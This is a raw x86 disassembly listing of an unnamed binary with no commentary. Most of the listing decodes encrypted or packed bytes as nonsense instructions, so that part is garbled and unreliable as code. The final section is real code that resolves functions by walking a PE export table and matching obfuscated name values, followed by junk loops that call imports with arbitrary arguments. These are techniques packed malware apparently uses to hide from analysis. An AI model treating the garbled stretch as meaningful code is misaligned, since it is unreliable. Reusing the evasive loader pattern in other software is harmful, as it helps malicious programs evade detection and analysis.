  40fe8d:	in     eax,0x55
  40fe8f:	and    BYTE PTR [eax-0xb],bh
  40fe92:	sub    dh,BYTE PTR [eax+ebx*2]
  40fe95:	jecxz  0x40fe56
  40fe97:	ja     0x40feed
  40fe99:	mov    al,0x44
  40fe9b:	xchg   ebx,eax
  40fe9c:	jge    0x40ff1d
  40fe9e:	mov    ebp,0xc1a2981d
  40fea3:	test   al,0xee
  40fea5:	or     eax,0x20e0b23
  40feaa:	add    eax,0xfebdce02
  40feaf:	in     al,dx
  40feb0:	push   0xbd5d0ea1
  40feb5:	pop    ax
  40feb7:	fstp   DWORD PTR [esi+eax*1]
  40feba:	and    al,0x95
  40febc:	and    bh,BYTE PTR [edi]
  40febe:	pop    ds
  40febf:	mov    bl,0xf3
  40fec1:	cli    
  40fec2:	dec    eax
  40fec3:	retf   
  40fec4:	mov    gs,WORD PTR [ebp+0x5364c945]
  40feca:	cmp    al,0xfe
  40fecc:	push   0x3f
  40fece:	fucomi st,st(6)
  40fed0:	push   0xffffffad
  40fed2:	mov    eax,0xd23dc3c1
  40fed7:	push   es
  40fed8:	mov    edi,0xec02cc20
  40fedd:	xchg   edx,eax
  40fede:	aam    0x6d
  40fee0:	xchg   edx,eax
  40fee1:	ficom  WORD PTR [edx+ebx*4-0x1]
  40fee5:	sbb    edi,DWORD PTR es:[eax]
  40fee8:	sahf   
  40fee9:	xchg   edx,eax
  40feea:	add    bl,bh
  40feec:	mov    ecx,0x673c7084
  40fef1:	dec    ebp
  40fef2:	test   al,0x5e
  40fef4:	pop    esi
  40fef5:	xchg   ebp,eax
  40fef6:	jbe    0x40ff3d
  40fef8:	shl    DWORD PTR [ebx],1
  40fefa:	(bad)
  40fefd:	mov    ah,0x9d
  40feff:	arpl   WORD PTR [esi+0x6a],ax
  40ff02:	jl     0x40ff63
  40ff04:	jecxz  0x40febe
  40ff06:	or     bl,BYTE PTR [edi]
  40ff08:	(bad)  
  40ff0a:	test   eax,0x39d8501
  40ff0f:	mov    BYTE PTR [esp+eax*8+0x2e],bl
  40ff13:	push   es
  40ff14:	pop    ebx
  40ff15:	push   es
  40ff16:	xchg   ebx,eax
  40ff17:	aas    
  40ff18:	dec    DWORD PTR [eax-0x409c7ae5]
  40ff1e:	es pop ecx
  40ff20:	scas   eax,DWORD PTR es:[edi]
  40ff21:	shr    ebx,0x74
  40ff24:	mov    ebp,eax
  40ff26:	shl    DWORD PTR [eax+0x14],1
  40ff29:	xchg   ecx,eax
  40ff2a:	xchg   ecx,eax
  40ff2b:	ror    DWORD PTR [edi+esi*1-0x28],0xf6
  40ff30:	sub    BYTE PTR [eax],0xec
  40ff33:	ret    0x3016
  40ff36:	stc    
  40ff37:	jmp    0xd8300591
  40ff3c:	ins    BYTE PTR es:[edi],dx
  40ff3d:	imul   edx,DWORD PTR [edx+0x7f],0xffffffe9
  40ff41:	mov    ah,0x8
  40ff43:	push   ds
  40ff44:	mov    dh,0x50
  40ff46:	mov    WORD PTR [ebx-0x25],gs
  40ff49:	dec    ebx
  40ff4a:	add    ebx,edi
  40ff4c:	pop    eax
  40ff4d:	int    0x8e
  40ff4f:	jb     0x40ff64
  40ff51:	lods   eax,DWORD PTR ds:[si]
  40ff53:	in     al,0x71
  40ff55:	push   ds
  40ff56:	xchg   esp,eax
  40ff57:	test   BYTE PTR [eax],0xa3
  40ff5a:	mov    ah,0x3d
  40ff5c:	pop    esi
  40ff5d:	js     0x40feff
  40ff5f:	xchg   ebx,esi
  40ff61:	and    DWORD PTR [edx+edi*1+0x591375aa],0x858d6c76
  40ff6c:	jno    0x40fef1
  40ff6e:	push   ebp
  40ff6f:	pop    es
  40ff70:	xchg   esp,eax
  40ff71:	add    ecx,DWORD PTR [ebp-0x141d6420]
  40ff77:	jecxz  0x40ffda
  40ff79:	mov    ds:0xd4bf78f7,al
  40ff7e:	std    
  40ff7f:	outs   dx,BYTE PTR ds:[esi]
  40ff80:	ret    0x1416
  40ff83:	pushf  
  40ff84:	jnp    0x40ff24
  40ff86:	cmp    al,0x79
  40ff88:	adc    edx,ebp
  40ff8a:	inc    eax
  40ff8b:	fbstp  TBYTE PTR [ebx]
  40ff8d:	pop    edi
  40ff8e:	mov    esi,0x6d7600b9
  40ff93:	jecxz  0x40ff50
  40ff95:	in     al,dx
  40ff96:	lods   eax,DWORD PTR ds:[esi]
  40ff97:	sbb    edx,DWORD PTR [edx]
  40ff99:	mov    bl,0xf
  40ff9b:	icebp  
  40ff9c:	scas   eax,DWORD PTR es:[edi]
  40ff9d:	fsub   QWORD PTR [ebp+0x46]
  40ffa0:	test   BYTE PTR [ebx],0xa9
  40ffa3:	jb     0x410004
  40ffa5:	xchg   edi,eax
  40ffa6:	adc    al,0xd0
  40ffa8:	retf   0x6792
  40ffab:	ret    
  40ffac:	in     eax,dx
  40ffad:	and    BYTE PTR [ecx+0x5c],bh
  40ffb0:	test   al,0xe6
  40ffb2:	sub    BYTE PTR [esi+0x2b],al
  40ffb5:	ror    BYTE PTR [eax+edx*2-0x28],1
  40ffb9:	push   ebx
  40ffba:	popf   
  40ffbb:	ins    BYTE PTR es:[edi],dx
  40ffbc:	aaa    
  40ffbd:	dec    eax
  40ffbe:	xor    esp,esp
  40ffc0:	xchg   DWORD PTR [esi],ebx
  40ffc2:	jg     0x40ff84
  40ffc4:	cdq    
  40ffc5:	inc    ebp
  40ffc6:	rcl    DWORD PTR [ecx-0x7013eca9],cl
  40ffcc:	int3   
  40ffcd:	pop    ebp
  40ffce:	fisub  WORD PTR [eax-0x5318e]
  40ffd4:	xor    eax,0x631d0aeb
  40ffd9:	ins    DWORD PTR es:[edi],dx
  40ffda:	inc    esp
  40ffdb:	ja     0x410015
  40ffdd:	outs   dx,DWORD PTR ds:[esi]
  40ffde:	sbb    BYTE PTR [edx+0x548e2c65],cl
  40ffe4:	stc    
  40ffe5:	daa    
  40ffe6:	and    BYTE PTR [edx+edi*8],0x3f
  40ffea:	jns    0x40ff72
  40ffec:	inc    edi
  40ffed:	pop    edi
  40ffee:	or     al,0x2
  40fff0:	bnd jnp 0x40ff92
  40fff3:	ret    
  40fff4:	not    DWORD PTR [edi]
  40fff6:	jg     0x410048
  40fff8:	sbb    DWORD PTR [ebx],esp
  40fffa:	and    BYTE PTR ss:[ecx-0x6caecf0b],ah
  410001:	dec    esp
  410002:	rol    DWORD PTR [edx+edx*2-0x1f1185d1],0x1d
  41000a:	out    dx,al
  41000b:	(bad)  
  41000c:	retf   0x17d2
  41000f:	popa   
  410010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410011:	mov    ah,0x74
  410013:	pop    ss
  410014:	and    ebp,DWORD PTR ds:0xfa9a1ce1
  41001a:	jbe    0x41001c
  41001c:	adc    eax,0x4cb427e4
  410021:	sub    eax,0xff67aa51
  410026:	cmp    bh,BYTE PTR [edx]
  410028:	xor    al,0xdd
  41002a:	xchg   ecx,eax
  41002b:	rcr    ecx,0xbf
  41002e:	ret    
  41002f:	or     bl,BYTE PTR [eax-0xa]
  410032:	sbb    ebp,ebp
  410034:	(bad)  
  410035:	jge    0x410012
  410037:	jb     0x410085
  410039:	ds popa 
  41003b:	inc    edx
  41003c:	or     edi,ebp
  41003e:	mov    ecx,0x351c54d9
  410043:	(bad)  [ebp-0x6deee7e4]
  410049:	inc    ebx
  41004a:	int    0xa6
  41004c:	mov    ds:0x4b0be714,al
  410051:	retf   0xec92
  410054:	bound  ebp,QWORD PTR [edi+0x724c371c]
  41005a:	inc    ebp
  41005b:	push   ebx
  41005c:	mov    eax,0xf9178aff
  410061:	outs   dx,BYTE PTR ds:[esi]
  410062:	xor    ah,BYTE PTR [ebp+ecx*8+0x6]
  410066:	and    eax,0x4a3a7918
  41006b:	retf   
  41006c:	add    ebx,DWORD PTR [edi-0x1d]
  41006f:	xor    edx,DWORD PTR [ecx]
  410071:	push   edx
  410072:	test   BYTE PTR [esi+ebp*1+0xeb8c23f],bl
  410079:	sbb    DWORD PTR [esi],0xb9a1e9f5
  41007f:	test   BYTE PTR [ebx],0xa7
  410082:	push   eax
  410083:	cwde   
  410084:	push   edi
  410085:	aaa    
  410086:	neg    DWORD PTR [ebx]
  410088:	inc    esp
  410089:	dec    ebp
  41008a:	dec    ecx
  41008b:	mov    bh,0x7
  41008d:	adc    DWORD PTR [edi+0x65a2b47c],ebp
  410093:	jns    0x41009d
  410095:	add    DWORD PTR [ecx],ebx
  410097:	or     al,0xd2
  410099:	stc    
  41009a:	xchg   esi,eax
  41009b:	fiadd  WORD PTR [esi]
  41009d:	and    cl,BYTE PTR [ebp-0x50]
  4100a0:	cmp    cl,bl
  4100a2:	stc    
  4100a3:	ins    BYTE PTR es:[edi],dx
  4100a4:	pop    ss
  4100a5:	xor    edi,ebp
  4100a7:	(bad)  
  4100a8:	jbe    0x410077
  4100aa:	add    BYTE PTR [eax+0x412957a1],ah
  4100b0:	mov    esi,0x176f0dfa
  4100b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b6:	cmp    edi,0xffffffb1
  4100b9:	lds    esp,FWORD PTR [eax-0x2c]
  4100bc:	int3   
  4100bd:	icebp  
  4100be:	int    0x3b
  4100c0:	(bad)  
  4100c1:	pop    es
  4100c2:	lar    edx,WORD PTR [edi-0x29]
  4100c6:	pop    ds
  4100c7:	int3   
  4100c8:	dec    edx
  4100c9:	xor    al,0x8c
  4100cb:	push   cs
  4100cc:	sbb    ebp,DWORD PTR [ecx-0x2d7c2c68]
  4100d2:	and    eax,ebx
  4100d4:	push   ecx
  4100d5:	sbb    cl,0x21
  4100d8:	add    al,BYTE PTR [eax+0x11fa22fd]
  4100de:	xchg   al,bl
  4100e0:	or     esi,DWORD PTR [ebx]
  4100e2:	ins    BYTE PTR es:[edi],dx
  4100e3:	rsqrtps xmm3,XMMWORD PTR [eax-0x6b]
  4100e7:	pop    esp
  4100e8:	lods   eax,DWORD PTR ds:[esi]
  4100e9:	pusha  
  4100ea:	pop    edi
  4100eb:	and    DWORD PTR [ebx],esi
  4100ed:	xchg   BYTE PTR [eax+0x1],dl
  4100f0:	mov    ebp,0x3dfdc58
  4100f5:	push   es
  4100f6:	inc    edx
  4100f7:	mov    ?,WORD PTR [edx+eiz*1+0x24]
  4100fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100fc:	push   es
  4100fd:	adc    eax,0xad263865
  410102:	add    eax,0x1ece4cbd
  410107:	ret    
  410108:	and    ch,BYTE PTR [esi+esi*8-0xf]
  41010c:	pushf  
  41010d:	push   esi
  41010e:	test   DWORD PTR [ebx+0x2b],eax
  410111:	jns    0x41018d
  410113:	scas   al,BYTE PTR es:[edi]
  410114:	inc    ecx
  410115:	dec    esi
  410116:	xor    ebx,DWORD PTR [ebx-0x69]
  410119:	dec    esi
  41011a:	dec    eax
  41011b:	and    BYTE PTR cs:[eax-0x6b],0xe
  410120:	mov    dl,0x6b
  410122:	or     ebp,DWORD PTR [eax+0x3a3ab8b0]
  410128:	inc    ebp
  410129:	mov    ah,0xe0
  41012b:	dec    ecx
  41012c:	jmp    0x4100d3
  41012e:	inc    esp
  41012f:	pop    ss
  410130:	or     eax,0x852cc276
  410135:	jle    0x4100cd
  410137:	jne    0x41010d
  410139:	push   cs
  41013a:	xor    DWORD PTR [ebx-0x63],ebp
  41013d:	sar    DWORD PTR [edi+0x16613263],1
  410143:	push   ebx
  410144:	add    al,BYTE PTR [esi+0xa]
  410147:	xor    bl,BYTE PTR [ebp-0x2c58ef23]
  41014d:	adc    dh,bl
  41014f:	out    dx,al
  410150:	outs   dx,BYTE PTR ds:[esi]
  410151:	mov    ah,0x9c
  410153:	int3   
  410154:	cdq    
  410155:	iret   
  410156:	jne    0x41015a
  410158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410159:	fs jno 0x4100e1
  41015c:	aad    0x81
  41015e:	mov    cl,0x78
  410160:	or     BYTE PTR [esi+0x6c6775fc],ch
  410166:	call   0x20425f1e
  41016b:	or     ah,BYTE PTR [edx+0x53]
  41016e:	rcr    DWORD PTR [esi+0x19ba8173],0x50
  410175:	cmp    esp,ebp
  410177:	test   eax,0x736529fe
  41017c:	aas    
  41017d:	in     al,0x40
  41017f:	out    dx,eax
  410180:	les    ebp,FWORD PTR [eax]
  410182:	push   edi
  410183:	mov    ecx,0x31fd23c7
  410188:	mov    esp,0x5cf83f6
  41018d:	imul   ebp,eax,0xfffffff4
  410190:	cdq    
  410191:	push   esp
  410192:	pop    ecx
  410193:	daa    
  410194:	std    
  410195:	adc    ebp,DWORD PTR [ebp+0x1e174933]
  41019b:	mov    bl,0x87
  41019d:	mov    BYTE PTR ds:0x822234b5,bl
  4101a3:	adc    al,0xf1
  4101a5:	xchg   ecx,eax
  4101a6:	xchg   edi,eax
  4101a7:	inc    edi
  4101a8:	mov    edi,0x25d33897
  4101ad:	jmp    0x8e7af32b
  4101b2:	push   0xffffffdf
  4101b4:	xor    edx,DWORD PTR [esi+0x721b9bd1]
  4101ba:	mov    ecx,0xdd2792d7
  4101bf:	hlt    
  4101c0:	hlt    
  4101c1:	push   esi
  4101c2:	int    0x84
  4101c4:	jmp    0x2200:0x24759afd
  4101cb:	sti    
  4101cc:	sbb    al,0x9b
  4101ce:	out    0xd0,eax
  4101d0:	or     dh,bl
  4101d2:	jle    0x410248
  4101d4:	jg     0x410202
  4101d6:	loope  0x41016e
  4101d8:	pusha  
  4101d9:	jo     0x410199
  4101db:	pop    ds
  4101dc:	or     BYTE PTR [eax-0x361ce51e],bl
  4101e2:	xchg   ebp,eax
  4101e3:	xchg   edx,edi
  4101e5:	mov    edi,0xc0964d04
  4101ea:	sbb    al,0xa7
  4101ec:	jmp    0x4ca7:0x5bf308ea
  4101f3:	xchg   DWORD PTR [ecx-0x13035852],ebp
  4101f9:	(bad)  
  4101fa:	fist   WORD PTR [edx+0x62]
  4101fd:	and    al,0x84
  4101ff:	cli    
  410200:	mov    DWORD PTR [edi],ebx
  410202:	hlt    
  410203:	out    0xa3,eax
  410205:	mov    al,0xe1
  410207:	in     al,0xf8
  410209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41020a:	push   edi
  41020b:	adc    edx,esi
  41020d:	cmp    DWORD PTR [eax+0x18],eax
  410210:	or     ebp,DWORD PTR [edi]
  410212:	stos   DWORD PTR es:[edi],eax
  410213:	addr16 dec esp
  410215:	sub    dh,BYTE PTR [eax+0x14dcf0b4]
  41021b:	pusha  
  41021c:	aas    
  41021d:	mov    ch,cl
  41021f:	imul   esp,DWORD PTR [ecx+0x61],0x58ae4a1c
  410226:	jl     0x4101c7
  410228:	aad    0x6d
  41022a:	push   ecx
  41022b:	das    
  41022c:	pop    DWORD PTR [ebp+0x505ce0eb]
  410232:	xor    DWORD PTR [edx-0x1167e4ce],esi
  410238:	mov    ebx,DWORD PTR ds:0x20ff209b
  41023e:	or     ah,BYTE PTR [bx+di-0x3a]
  410242:	pop    ebp
  410243:	(bad)  
  410244:	stos   BYTE PTR es:[edi],al
  410245:	aaa    
  410246:	pop    ds
  410247:	jge    0x41020a
  410249:	xor    esp,esi
  41024b:	sar    DWORD PTR [eax],1
  41024d:	fldenv [edx-0x4a473875]
  410253:	stos   BYTE PTR es:[edi],al
  410254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410255:	iret   
  410256:	and    al,cl
  410258:	xchg   ebx,eax
  410259:	ret    
  41025a:	pop    esp
  41025b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41025d:	(bad)  
  41025e:	sbb    eax,0xf7fe4b0e
  410263:	sbb    cl,BYTE PTR [edi]
  410265:	ds pop ds
  410267:	push   eax
  410268:	bound  esi,QWORD PTR [edi+0x2c]
  41026b:	mov    DWORD PTR [ecx-0x406d8f2],edi
  410271:	je     0x41020e
  410273:	rcl    DWORD PTR [ecx+0x1e7ac065],cl
  410279:	shl    DWORD PTR [edi-0x1a1fd713],1
  41027f:	and    al,0x4b
  410281:	daa    
  410282:	adc    ah,BYTE PTR [edi+0x2d]
  410285:	rol    DWORD PTR [edi-0x6d],1
  410288:	adc    al,0x53
  41028a:	dec    edi
  41028b:	mov    esp,0x4b1b6036
  410290:	xor    DWORD PTR [edi+0x7],esi
  410293:	xlat   BYTE PTR ds:[ebx]
  410294:	enter  0x2787,0xd2
  410298:	xchg   edx,eax
  410299:	sbb    bl,ch
  41029b:	xlat   BYTE PTR ds:[ebx]
  41029c:	pop    esp
  41029d:	addr16 xchg ebp,eax
  41029f:	call   0xc6e9:0x13e8a094
  4102a6:	xchg   ecx,eax
  4102a7:	xchg   ecx,eax
  4102a8:	push   eax
  4102a9:	out    dx,eax
  4102aa:	inc    esp
  4102ab:	sub    DWORD PTR [eax+0x4f6bed5f],eax
  4102b1:	mov    al,0xc6
  4102b3:	repz aas 
  4102b5:	push   edx
  4102b6:	mov    esi,0xe454d97d
  4102bb:	stc    
  4102bc:	dec    esp
  4102bd:	push   ebp
  4102be:	in     eax,dx
  4102bf:	cwde   
  4102c0:	js     0x4102b2
  4102c2:	cmp    al,0x1b
  4102c4:	push   ax
  4102c6:	sti    
  4102c7:	push   ebx
  4102c8:	mov    ebx,DWORD PTR [edx+ebx*4-0x1408b0cc]
  4102cf:	inc    ecx
  4102d0:	das    
  4102d1:	fiadd  WORD PTR [eax]
  4102d3:	in     eax,0x99
  4102d5:	mov    DWORD PTR [eax-0x7da4af74],esi
  4102db:	mov    edx,0xdec70293
  4102e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102e1:	dec    edi
  4102e2:	and    eax,0x702d3df0
  4102e7:	jge    0x410366
  4102e9:	mov    dl,0x9
  4102eb:	repz mov ebx,0x16405912
  4102f1:	jp     0x4102dd
  4102f3:	fistp  DWORD PTR [ebx]
  4102f5:	jge    0x4102ed
  4102f7:	int    0x19
  4102f9:	push   ss
  4102fa:	fmul   QWORD PTR [ebx+0x53e0e2eb]
  410300:	inc    edi
  410301:	sbb    dh,cl
  410303:	pop    ebp
  410304:	dec    ebp
  410305:	sbb    eax,DWORD PTR [ecx]
  410307:	in     al,0xd
  410309:	adc    DWORD PTR [edx],0xffffff9b
  41030c:	adc    al,BYTE PTR [esi]
  41030e:	call   DWORD PTR [edx+ebx*8+0x18801b82]
  410315:	mov    ebp,0x46321ed5
  41031a:	inc    edx
  41031b:	mov    bl,0xb7
  41031d:	sbb    DWORD PTR [esi],ecx
  41031f:	ret    
  410320:	sub    BYTE PTR [eax+0x5e],0x8
  410324:	pop    edi
  410325:	push   0xffffffd1
  410327:	push   0x6b
  410329:	fsub   DWORD PTR [esi]
  41032b:	add    eax,0xabfc82ae
  410330:	xor    BYTE PTR ds:0xfd8f5f1f,0x48
  410337:	xchg   ebp,eax
  410338:	lock push esp
  41033a:	jecxz  0x41033c
  41033c:	repnz and eax,0x5b88fccb
  410342:	xor    eax,0xedd03844
  410347:	out    dx,al
  410348:	je     0x4102e9
  41034a:	lahf   
  41034b:	call   0x4c04:0x859d6bcf
  410352:	xchg   ecx,eax
  410353:	adc    eax,0xe267c38c
  410358:	sbb    DWORD PTR [ecx-0x6d],ecx
  41035b:	lds    eax,FWORD PTR [ecx]
  41035d:	pop    edi
  41035e:	dec    eax
  41035f:	rol    ecx,1
  410361:	ror    DWORD PTR [bp+0x2991],0x5a
  410367:	mov    WORD PTR [edi],ds
  410369:	loopne 0x41037b
  41036b:	or     DWORD PTR [ebx+0x3b4bbb],ecx
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d46c
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff42
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d580
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d57c,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d46c
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
